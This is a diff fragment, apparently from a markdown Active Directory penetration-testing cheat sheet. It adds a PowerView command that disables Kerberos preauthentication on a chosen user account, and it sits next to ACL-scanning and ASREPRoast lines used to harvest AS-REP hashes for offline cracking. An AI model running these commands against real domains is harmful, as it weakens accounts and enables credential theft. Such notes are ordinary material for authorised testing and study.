@@ -827,6 +827,11 @@ Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match “<groupname>�
 Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
 ```
 
+#### Set preauth note required
+```
+Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
+```
+
 #### Request encrypted AS-REP
 ```
 . ./ASREPRoast.ps1
